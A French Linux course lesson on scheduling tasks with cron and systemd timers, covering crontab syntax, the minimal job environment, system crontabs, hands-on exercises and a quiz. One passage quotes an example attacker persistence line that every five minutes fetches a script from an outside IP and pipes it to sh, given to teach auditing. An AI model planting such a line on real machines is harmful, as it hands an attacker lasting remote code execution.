@@ -1,0 +1,234 @@
+---
+refCode: CL-LSN-02053-V01
+slug: linux-planifier
+title: "Planifier : cron et les minuteurs systemd"
+description: "Faire tourner un script tout seul, à heure fixe : le démon cron et la crontab de chaque compte, la syntaxe des cinq champs, l'environnement minimal dans lequel une tâche s'exécute (chemin, dossier courant, PATH, le piège du %), où vont ses messages, les crontabs du système et les dossiers cron.daily, cron comme cachette d'un attaquant, puis les minuteurs systemd : OnCalendar, Persistent, list-timers et journalctl. Avec une vraie tâche cron qui écrit au mauvais endroit, sur un vrai Linux."
+category: DEV
+difficulty: INTERMEDIATE
+estimatedMinutes: 45
+xpReward: 320
+prerequisites: ["CL-LSN-02052-V01"]
+---
+
+Un script de sauvegarde ne sert à rien s'il faut penser à le lancer. La dernière étape, c'est de le **planifier** : chaque nuit à 2 h 30, chaque lundi, toutes les quinze minutes. Linux offre deux outils pour cela : **cron**, présent sur tous les Unix depuis les années 1970, et les **minuteurs systemd**, plus récents. Tu vas apprendre les deux, et surtout le piège qui attend chaque tâche planifiée : elle ne s'exécute pas dans ton terminal, mais dans un environnement presque vide, où ce qui marchait à la main ne marche plus.
+
+## objectifs
+
+À la fin de cette leçon, tu sais :
+
+- planifier une tâche dans ta crontab, et lire la syntaxe des cinq champs ;
+- prévoir l'environnement d'une tâche cron : dossier courant, `PATH`, shell, le caractère `%` ;
+- récupérer ce qu'une tâche affiche, au lieu de le perdre ;
+- t'y retrouver entre les crontabs des comptes, `/etc/crontab`, `/etc/cron.d` et les dossiers `cron.daily` ;
+- vérifier qu'aucune tâche planifiée n'a été ajoutée à ton insu ;
+- écrire un minuteur systemd, et le suivre avec `systemctl list-timers` et `journalctl`.
+
+## pourquoi ça compte
+
+Les tâches planifiées font tourner la vie d'un serveur : sauvegardes, rotation des journaux, renouvellement des certificats, mises à jour de sécurité. Elles tournent la nuit, sans témoin, souvent avec les droits de root. C'est ce qui les rend précieuses, et c'est aussi ce qui en fait une cible : une ligne ajoutée discrètement dans une crontab est l'un des moyens les plus classiques pour un attaquant de **garder la main** sur une machine compromise, même après un redémarrage. Savoir lire les tâches planifiées d'un système, c'est savoir ce qu'il fait quand personne ne regarde.
+
+## cron et la crontab
+
+Le démon **cron** (`cron` sur Debian, `crond` ailleurs) se réveille chaque minute et lance les tâches dont l'heure est venue. Chaque compte a sa propre table, sa **crontab**, qu'on manipule avec la commande du même nom :
+
+```bash
+crontab -e     # ouvre ta crontab dans l'éditeur, et l'installe à la fermeture
+crontab -l     # l'affiche
+crontab -r     # la SUPPRIME, sans confirmation
+```
+
+Ne modifie jamais les fichiers de `/var/spool/cron/crontabs` à la main : `crontab -e` vérifie la syntaxe et prévient le démon. Méfie-toi de `crontab -r` : `r` est voisin de `e` sur le clavier, et une faute de frappe efface toute la table. Une copie de temps en temps, `crontab -l > ~/crontab.sauvegarde`, n'est jamais perdue.
+
+## les cinq champs
+
+Chaque ligne d'une crontab se compose de cinq champs de date, puis de la commande :
+
+```text
+# minute  heure  jour du mois  mois  jour de la semaine  commande
+  30      2      *             *     *                   /usr/local/bin/sauvegarde.sh -y
+```
+
+| Champ | Valeurs |
+| --- | --- |
+| minute | 0 à 59 |
+| heure | 0 à 23 |
+| jour du mois | 1 à 31 |
+| mois | 1 à 12 |
+| jour de la semaine | 0 à 7, où 0 et 7 sont le dimanche, 1 le lundi |
+
+Dans chaque champ, `*` veut dire « toutes les valeurs », `1,15` une liste, `1-5` un intervalle, et `*/15` « toutes les 15 ». Quelques exemples :
+
+| Ligne | Quand |
+| --- | --- |
+| `30 2 * * *` | chaque jour à 2 h 30 |
+| `*/15 * * * *` | toutes les quinze minutes |
+| `0 8 * * 1-5` | à 8 h, du lundi au vendredi |
+| `0 3 1 * *` | à 3 h, le 1er de chaque mois |
+| `0 */6 * * *` | à 0 h, 6 h, 12 h et 18 h |
+
+Un piège : quand le jour du mois **et** le jour de la semaine sont tous deux précisés, cron lance la tâche si **l'un ou l'autre** correspond. `0 9 1 * 1` s'exécute le 1er du mois **et** chaque lundi, pas seulement le lundi 1er. Le site crontab.guru traduit une ligne en clair, et lève le doute.
+
+## l'environnement d'une tâche cron
+
+Une tâche cron ne voit **pas** ton environnement de terminal. Elle s'exécute :
+
+- avec un **`PATH` minimal**, souvent `/usr/bin:/bin` : une commande de `/usr/local/bin` ou `/usr/sbin` est « introuvable » ;
+- avec **`/bin/sh`**, pas bash, pour la ligne de la crontab elle-même ;
+- dans le **répertoire personnel** du compte : un chemin relatif dans le script vise ce dossier-là, pas celui du script ;
+- **sans terminal** : pas de question possible, d'où les options comme `-y` de la leçon sur les entrées ;
+- sans tes réglages de `~/.bashrc` ni tes alias.
+
+La règle qui en découle : dans une tâche planifiée, **des chemins absolus partout**, pour la commande comme pour les fichiers qu'elle lit et écrit. On peut aussi fixer le `PATH` en tête de crontab : `PATH=/usr/local/bin:/usr/bin:/bin`.
+
+Dernier piège, propre à cron : le caractère **`%`** a un sens spécial dans une ligne de crontab, celui d'un retour à la ligne. `date +%F` y devient une commande coupée en morceaux. Il faut l'échapper, `date +\%F`, ou mieux, mettre la commande dans un script, où `%` redevient ordinaire.
+
+## où vont les messages
+
+Ce qu'une tâche affiche n'apparaît nulle part à l'écran. cron l'envoie par **courrier** au propriétaire de la crontab, à l'adresse de la variable `MAILTO` si elle est définie, et sur un serveur sans messagerie configurée, ces messages sont tout simplement perdus. La solution sûre est de les rediriger dans un journal :
+
+```text
+30 2 * * * /usr/local/bin/sauvegarde.sh -y >> /var/log/sauvegarde.log 2>&1
+```
+
+`2>&1` y range aussi les erreurs, qui sont justement ce qu'on veut retrouver. Dans le script, `logger -t sauvegarde "message"` écrit dans le journal du système, consultable avec `journalctl -t sauvegarde`. Et une tâche qui peut durer plus longtemps que son intervalle s'enveloppe d'un verrou, comme à la leçon sur la robustesse : `flock -n /run/lock/sauvegarde.lock /usr/local/bin/sauvegarde.sh -y`.
+
+## les tâches du système
+
+À côté des crontabs des comptes, le système a les siennes :
+
+- **`/etc/crontab`** et les fichiers de **`/etc/cron.d/`**, posés par les paquets. Leurs lignes ont un **sixième champ**, le compte qui exécute la tâche : `30 2 * * * root /usr/local/bin/sauvegarde.sh -y` ;
+- les dossiers **`/etc/cron.hourly/`**, **`cron.daily/`**, **`cron.weekly/`** et **`cron.monthly/`** : on y dépose un script exécutable, que `run-parts` lancera à la fréquence du dossier. Attention, sur Debian, `run-parts` ignore les fichiers dont le nom contient un point : `sauvegarde` est lancé, `sauvegarde.sh` ne l'est pas ;
+- sur un portable ou un poste qui n'est pas allumé en permanence, **anacron** rattrape les tâches quotidiennes manquées pendant l'arrêt.
+
+## la crontab, cachette favorite
+
+Une ligne comme celle-ci, dans la crontab de `www-data`, n'a rien à faire sur un serveur web :
+
+```text
+*/5 * * * * curl -s http://203.0.113.50/m.sh | sh
+```
+
+Toutes les cinq minutes, la machine télécharge et exécute ce que l'attaquant veut : c'est une **persistance** classique, que la technique T1053.003 de MITRE ATT&CK décrit précisément. Lors d'un audit ou d'une enquête, on passe en revue **toutes** les tâches planifiées : `crontab -l -u compte` pour chaque compte, `/etc/crontab`, `/etc/cron.d/`, les dossiers `cron.*`, et les minuteurs systemd. Deux mesures en réduisent le risque : n'autoriser `crontab` qu'aux comptes qui en ont besoin, avec le fichier **`/etc/cron.allow`**, et veiller à ce que tout script lancé par la crontab de root ne soit **modifiable que par root**, sinon le modifier revient à exécuter du code en root.
+
+## les minuteurs systemd
+
+Sur les distributions modernes, systemd offre une alternative : un **minuteur** (*timer*) déclenche un **service**. Il faut deux fichiers, que le module suivant sur systemd détaillera. Le service dit **quoi** lancer :
+
+```ini
+# /etc/systemd/system/sauvegarde.service
+[Unit]
+Description=Sauvegarde nocturne
+
+[Service]
+Type=oneshot
+ExecStart=/usr/local/bin/sauvegarde.sh -y
+```
+
+Le minuteur dit **quand** :
+
+```ini
+# /etc/systemd/system/sauvegarde.timer
+[Unit]
+Description=Sauvegarde nocturne, les jours ouvrés
+
+[Timer]
+OnCalendar=Mon..Fri 02:30
+Persistent=true
+RandomizedDelaySec=10min
+
+[Install]
+WantedBy=timers.target
+```
+
+`OnCalendar=` a sa propre syntaxe, plus lisible que celle de cron : `daily`, `weekly`, `*-*-* 02:30:00`, `Mon..Fri 08:00`, `*:0/15` pour toutes les quinze minutes. `systemd-analyze calendar "Mon..Fri 02:30"` vérifie une expression et donne sa prochaine échéance. **`Persistent=true`** rattrape une exécution manquée pendant que la machine était éteinte, comme anacron. **`RandomizedDelaySec`** étale le démarrage, pour que cent serveurs ne lancent pas leur sauvegarde à la même seconde.
+
+On active le minuteur, pas le service : `systemctl enable --now sauvegarde.timer`. `systemctl list-timers` montre la prochaine et la dernière exécution de chaque minuteur, et `journalctl -u sauvegarde.service` donne tout ce que le script a affiché, horodaté, sans aucune redirection à écrire.
+
+| | cron | minuteur systemd |
+| --- | --- | --- |
+| Mise en place | une ligne | deux fichiers |
+| Ce qu'affiche la tâche | perdu, sauf redirection | dans le journal, avec `journalctl` |
+| Exécution manquée pendant un arrêt | perdue (sauf anacron) | rattrapée avec `Persistent=true` |
+| Deux exécutions simultanées | possibles, il faut `flock` | impossibles : un service ne démarre pas deux fois |
+| Prochaine exécution | à calculer de tête | `systemctl list-timers` |
+| Présent partout | oui, tous les Unix | seulement avec systemd |
+
+<Diagram caption="Deux chemins vers le même script">
+flowchart LR
+  A["crond, chaque minute"] -->|"lit la crontab"| B["la ligne dont l'heure est venue"]
+  B --> C["sh, PATH minimal, dossier personnel"]
+  D["systemd"] -->|"échéance du timer"| E["sauvegarde.timer"]
+  E -->|"démarre"| F["sauvegarde.service"]
+  F --> G["sortie dans journalctl"]
+  C --> H["/usr/local/bin/sauvegarde.sh"]
+  F --> H
+</Diagram>
+
+## à toi de jouer
+
+D'abord, une vraie tâche cron. `collecte.sh` note l'heure et la charge de la machine dans `collecte.log`. Ce petit Linux ne démarre pas cron tout seul : tu vas le lancer toi-même, comme le fait le système d'un vrai serveur au démarrage.
+
+1. rends le script exécutable et essaie-le à la main : `chmod 755 collecte.sh`, `./collecte.sh`, puis `cat collecte.log`. Tout marche. Supprime ce premier résultat : `rm collecte.log` ;
+2. ce petit Linux n'a même pas le dossier où cron range les crontabs, qu'un vrai système crée à l'installation : `mkdir -p /var/spool/cron/crontabs` ;
+3. installe la tâche, toutes les minutes. Sur un serveur, tu passerais par `crontab -e` ; ici, on donne la ligne directement à `crontab` : `echo '* * * * * /mnt/collecte.sh' | crontab -`, puis vérifie avec `crontab -l` ;
+4. démarre le démon : `crond`. Il a besoin de son dossier dès le démarrage, d'où l'ordre de ces étapes ;
+5. attends que la minute change (`date` donne l'heure), puis regarde : `ls`. Pas de `collecte.log` ! Cherche-le dans le répertoire personnel de root : `ls /root` ;
+6. tu as compris : cron lance le script depuis le répertoire personnel, et le script écrit à un chemin relatif. Corrige-le avec un chemin absolu : `sed -i 's|>> collecte.log|>> /mnt/collecte.log|' collecte.sh` ;
+7. attends la minute suivante, et vérifie avec `cat collecte.log`. Enfin, garde une copie de ta crontab : `crontab -l > crontab.txt`.
+
+<LinuxTerminal title="Une vraie tâche cron" files={{"collecte.sh": "#!/bin/bash\n# collecte.sh : note l'heure et la charge de la machine dans collecte.log.\necho \"$(date +%T) charge : $(cut -d' ' -f1 /proc/loadavg)\" >> collecte.log\n"}} expectedCommands={["chmod 755 collecte.sh", "./collecte.sh", "mkdir -p /var/spool/cron/crontabs", "echo '* * * * * /mnt/collecte.sh' | crontab -", "crontab -l", "crond", "ls /root", "crontab -l > crontab.txt"]} checks={[{"label": "Le script écrit à un chemin absolu", "path": "collecte.sh", "expect": "file", "contains": ">> /mnt/collecte.log"}, {"label": "cron a rempli collecte.log dans /mnt", "path": "collecte.log", "expect": "file", "contains": "charge :"}, {"label": "crontab.txt garde la tâche", "path": "crontab.txt", "expect": "file", "contains": "/mnt/collecte.sh"}]} hints={["crond rend la main tout de suite : il tourne en arrière-plan et se réveille à chaque minute pleine. Sans son dossier, il s'arrête aussitôt : ps | grep crond le montre.", "La tâche s'exécute à la minute pleine suivante : date indique combien de secondes il reste.", "Le journal égaré est dans /root, le répertoire personnel de root, où cron lance ses tâches.", "Le sed utilise | comme séparateur, pour ne pas avoir à protéger les / du chemin.", "Les vérifications se refont après chaque commande : tape cat collecte.log une fois la minute passée."]} />
+
+Le script marchait parfaitement à la main, parce que tu le lançais depuis `/mnt`. Sous cron, le dossier courant était `/root`, et le journal y est parti sans un mot d'erreur. C'est le premier piège de toute tâche planifiée : une fois le script corrigé, supprime d'ailleurs le journal égaré avec `rm /root/collecte.log`. Une autre correction aurait été d'ajouter `cd "$(dirname "$0")" || exit 1` en tête du script, pour qu'il travaille toujours dans son propre dossier.
+
+Ensuite, le minuteur systemd. Le petit Linux des exercices n'a pas systemd : ce terminal-ci le simule, sur un serveur Debian où `sauvegarde.service` et `sauvegarde.timer` sont déjà écrits.
+
+1. relis le minuteur : `cat /etc/systemd/system/sauvegarde.timer` ;
+2. vérifie l'expression : `systemd-analyze calendar "Mon..Fri 02:30"` ;
+3. active-le : `sudo systemctl enable --now sauvegarde.timer` ;
+4. regarde sa prochaine échéance : `systemctl list-timers sauvegarde.timer` ;
+5. relis ce qu'a affiché la dernière sauvegarde : `journalctl -u sauvegarde.service -n 5`.
+
+<SimulatedTerminal shell="bash" title="Un minuteur systemd" expectedCommands={["cat /etc/systemd/system/sauvegarde.timer", "systemd-analyze calendar \"Mon..Fri 02:30\"", "sudo systemctl enable --now sauvegarde.timer", "systemctl list-timers sauvegarde.timer", "journalctl -u sauvegarde.service -n 5"]} hints={["Le minuteur dit quand, le service dit quoi : relis les deux fichiers.", "systemd-analyze calendar vérifie une expression OnCalendar et donne sa prochaine échéance.", "On active le .timer, pas le .service.", "LEFT indique le temps restant avant la prochaine exécution ; RandomizedDelaySec décale un peu l'heure."]} commands={{"cat /etc/systemd/system/sauvegarde.timer": "[Unit]\nDescription=Sauvegarde nocturne, les jours ouvrés\n\n[Timer]\nOnCalendar=Mon..Fri 02:30\nPersistent=true\nRandomizedDelaySec=10min\n\n[Install]\nWantedBy=timers.target", "cat /etc/systemd/system/sauvegarde.service": "[Unit]\nDescription=Sauvegarde nocturne\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/sauvegarde.sh -y", "systemd-analyze calendar \"Mon..Fri 02:30\"": "  Original form: Mon..Fri 02:30\nNormalized form: Mon..Fri *-*-* 02:30:00\n    Next elapse: Fri 2026-10-02 02:30:00 CEST\n       (in UTC): Fri 2026-10-02 00:30:00 UTC\n       From now: 8h left", "systemd-analyze calendar 'Mon..Fri 02:30'": "  Original form: Mon..Fri 02:30\nNormalized form: Mon..Fri *-*-* 02:30:00\n    Next elapse: Fri 2026-10-02 02:30:00 CEST\n       (in UTC): Fri 2026-10-02 00:30:00 UTC\n       From now: 8h left", "sudo systemctl enable --now sauvegarde.timer": "Created symlink /etc/systemd/system/timers.target.wants/sauvegarde.timer → /etc/systemd/system/sauvegarde.timer.", "systemctl list-timers sauvegarde.timer": "NEXT                         LEFT    LAST PASSED UNIT             ACTIVATES\nFri 2026-10-02 02:34:12 CEST 8h left -    -      sauvegarde.timer sauvegarde.service\n\n1 timers listed.\nPass --all to see loaded but inactive timers, too.", "systemctl list-timers": "NEXT                         LEFT    LAST PASSED UNIT             ACTIVATES\nFri 2026-10-02 02:34:12 CEST 8h left -    -      sauvegarde.timer sauvegarde.service\n\n1 timers listed.\nPass --all to see loaded but inactive timers, too.", "journalctl -u sauvegarde.service -n 5": "oct. 01 02:36:47 srv-app-01 systemd[1]: Starting sauvegarde.service - Sauvegarde nocturne...\noct. 01 02:36:47 srv-app-01 sauvegarde.sh[51204]: Archive /srv/sauvegardes/donnees-2026-10-01.tar.gz créée (1,8 Go)\noct. 01 02:39:02 srv-app-01 sauvegarde.sh[51204]: 7 archives gardées, 1 supprimée\noct. 01 02:39:02 srv-app-01 systemd[1]: sauvegarde.service: Deactivated successfully.\noct. 01 02:39:02 srv-app-01 systemd[1]: Finished sauvegarde.service - Sauvegarde nocturne.", "systemctl status sauvegarde.timer": "● sauvegarde.timer - Sauvegarde nocturne, les jours ouvrés\n     Loaded: loaded (/etc/systemd/system/sauvegarde.timer; enabled; preset: enabled)\n     Active: active (waiting) since Thu 2026-10-01 17:58:20 CEST; 12s ago\n    Trigger: Fri 2026-10-02 02:34:12 CEST; 8h left\n   Triggers: ● sauvegarde.service"}} />
+
+## les pièges
+
+- **Un chemin relatif dans une tâche planifiée.** Le dossier courant est le répertoire personnel : des chemins absolus partout.
+- **Compter sur ton `PATH`.** cron a un `PATH` minimal : chemins complets, ou `PATH=` en tête de crontab.
+- **Un `%` dans une ligne de crontab.** C'est un retour à la ligne : `\%`, ou un script.
+- **Ne pas rediriger la sortie.** Sans messagerie, les erreurs disparaissent : `>> journal 2>&1`.
+- **Taper `crontab -r` au lieu de `-e`.** Toute la table part, sans confirmation.
+- **Nommer `sauvegarde.sh` un script de `/etc/cron.daily`.** `run-parts` ignore les noms avec un point sur Debian.
+- **Un script de la crontab de root modifiable par d'autres.** C'est offrir root à qui peut l'éditer.
+- **Activer le service au lieu du minuteur.** C'est `systemctl enable --now nom.timer`.
+
+## pour aller plus loin
+
+<ExternalLink href="https://crontab.guru/" description="Traduit une ligne de crontab en clair et donne ses prochaines exécutions, en anglais">crontab.guru</ExternalLink>
+
+<ExternalLink href="https://manpages.debian.org/bookworm/cron/crontab.5.fr.html" description="La syntaxe complète d'une crontab, en français">Page de manuel crontab(5)</ExternalLink>
+
+<ExternalLink href="https://www.freedesktop.org/software/systemd/man/latest/systemd.timer.html" description="Toutes les options des minuteurs systemd, en anglais">systemd.timer</ExternalLink>
+
+<ExternalLink href="https://attack.mitre.org/techniques/T1053/003/" description="Comment les attaquants utilisent cron pour persister, et comment le détecter, en anglais">MITRE ATT&CK : Scheduled Task/Job, Cron</ExternalLink>
+
+## quiz
+
+<QuizGroup>
+  <Quiz id="q-1" question="Que signifie la ligne de crontab 30 2 * * * /usr/local/bin/sauvegarde.sh ?" options={["Toutes les 30 minutes, 2 fois par jour", "Chaque jour à 2 h 30", "Le 30 février", "Toutes les 2 heures 30"]} correct={1} explanation="Les champs sont, dans l'ordre : minute, heure, jour du mois, mois, jour de la semaine." />
+  <Quiz id="q-2" question="Que signifie */15 dans le champ des minutes ?" options={["À la minute 15", "Toutes les quinze minutes", "Quinze fois par heure", "Pendant quinze minutes"]} correct={1} explanation="*/N veut dire toutes les N unités : 0, 15, 30 et 45." />
+  <Quiz id="q-3" question="Un script lancé par cron écrit dans journal.txt, sans chemin. Où le fichier est-il créé ?" options={["Dans le dossier du script", "Dans le répertoire personnel du compte qui exécute la tâche", "Dans /tmp", "Nulle part"]} correct={1} explanation="Le dossier courant d'une tâche cron est le répertoire personnel : on écrit des chemins absolus." />
+  <Quiz id="q-4" question="Pourquoi date +%F pose-t-il problème directement dans une ligne de crontab ?" options={["date n'existe pas pour cron", "Parce que % y signifie un retour à la ligne : il faut l'écrire \\% ou passer par un script", "Parce que %F n'est pas un format valide", "Il ne pose aucun problème"]} correct={1} explanation="Dans une crontab, le premier % termine la commande et la suite devient son entrée." />
+  <Quiz id="q-5" question="Où part ce qu'affiche une tâche cron sur un serveur sans messagerie, si on ne le redirige pas ?" options={["Dans /var/log/syslog", "Il est perdu", "À l'écran de root", "Dans le dossier du script"]} correct={1} explanation="cron envoie la sortie par courrier ; sans messagerie, elle disparaît : >> journal 2>&1." />
+  <Quiz id="q-6" question="Pourquoi un enquêteur passe-t-il en revue les crontabs d'une machine compromise ?" options={["Pour mesurer la charge", "Parce qu'une tâche planifiée est un moyen classique pour un attaquant de garder la main sur la machine", "Pour vérifier l'heure", "Par habitude"]} correct={1} explanation="Une ligne ajoutée relance le code de l'attaquant régulièrement, même après un redémarrage : MITRE ATT&CK T1053.003." />
+  <Quiz id="q-7" question="Que fait Persistent=true dans un minuteur systemd ?" options={["Il rend le service permanent", "Il rattrape une exécution manquée pendant que la machine était éteinte", "Il empêche l'arrêt du minuteur", "Il garde les journaux"]} correct={1} explanation="Au redémarrage, systemd lance la tâche si son échéance est passée pendant l'arrêt." />
+</QuizGroup>
+
+## à retenir
+
+- **`crontab -e`** pour modifier, **`-l`** pour lire ; attention à **`-r`**, qui efface tout.
+- Cinq champs : **minute, heure, jour du mois, mois, jour de la semaine** ; `*`, `1,15`, `1-5`, `*/15`.
+- Une tâche cron a un **`PATH` minimal**, tourne dans le **répertoire personnel**, sans terminal : **chemins absolus**, options plutôt que questions, `\%` dans la crontab.
+- Sa sortie se perd : **`>> journal 2>&1`**, ou `logger`.
+- `/etc/crontab` et **`/etc/cron.d/`** ont un champ « compte » ; **`/etc/cron.daily/`** et ses voisins exécutent des scripts sans point dans le nom.
+- Les tâches planifiées sont une **cachette d'attaquant** : on les passe toutes en revue, et leurs scripts ne sont modifiables que par leur propriétaire.
+- Un **minuteur systemd** : un `.service` et un `.timer` avec **`OnCalendar=`**, **`Persistent=true`**, activé par `systemctl enable --now nom.timer`, suivi avec **`systemctl list-timers`** et **`journalctl -u`**.
